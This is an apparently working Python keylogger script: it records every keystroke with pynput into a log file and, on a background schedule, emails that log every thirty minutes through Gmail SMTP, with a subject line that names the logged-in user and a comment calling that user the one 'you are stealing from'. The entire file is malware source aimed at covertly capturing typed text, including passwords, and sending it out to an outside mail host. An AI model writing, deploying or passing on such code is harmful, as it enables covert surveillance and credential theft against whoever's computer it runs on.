from pynput.keyboard import Listener
import logging, smtplib, getpass, time, threading
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 
from datetime import datetime
import schedule

log_dir = ""
logged = []
fromaddr = "test@gmail.com"
toaddr = "test@gmail.com"

# Set formatting for the log file
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# SENDING THE EMAIL
def sendMail():
    print("Sending?")
    # instance of MIMEMultipart
    msg = MIMEMultipart()
    
    # storing the senders email address
    msg['From'] = fromaddr
    
    # storing the receivers email address
    msg['To'] = toaddr
    
    # storing the subject
    msg['Subject'] = str(datetime.now().strftime("%m/%d/%Y %H:%M")) + " - KeyLogging Dump for User: " + getpass.getuser() # Add dynamic date/user you are stealing from
    
    # string to store the body of the mail
    body = "See Attachment"
    
    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))

    # open the file to be sent
    filename = "key_log.txt"
    attachment = open('key_log.txt', "rb")
    
    # instance of MIMEBase and named as p
    p = MIMEBase('application', 'octet-stream')
    
    # To change the payload into encoded form
    p.set_payload((attachment).read())
    
    # encode into base64
    encoders.encode_base64(p)
    
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    
    # attach the instance 'p' to instance 'msg'
    msg.attach(p)
    
    # creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)
    
    # start TLS for security
    s.starttls()
    
    # Authentication
    s.login(fromaddr, "password")
    
    # Converts the Multipart msg into a string
    text = msg.as_string()
    
    # sending the mail
    s.sendmail(fromaddr, toaddr, text)

    # terminating the session
    s.quit()

# Schedule to send email report every half hour
schedule.every(30).minutes.do(sendMail)

def sched():
    # Run scheduler
    while True:
        print("test")
        schedule.run_pending()
        time.sleep(1)

# What happens when a key is pressed
# Add functionality for shift key and other keys, as well as make sure you don't have to press space for info to be stored.
def on_press(key):
    if(str(key) == "Key.backspace"):
        if(len(logged) > 0):
            logged.pop()
    elif(str(key) == "Key.space" or str(key) == "Key.enter"):
        logging.debug('"' + ''.join(logged) + '"')
        logged.clear()  
    elif(str(key) != "Key.shift_r" and str(key) != "Key.shift_l"):
        logged.append(str(key).replace("'", ""))

x = threading.Thread(target=sched)
x.start()

# Listen for keypress
with Listener(on_press=on_press) as listener:
    listener.join()
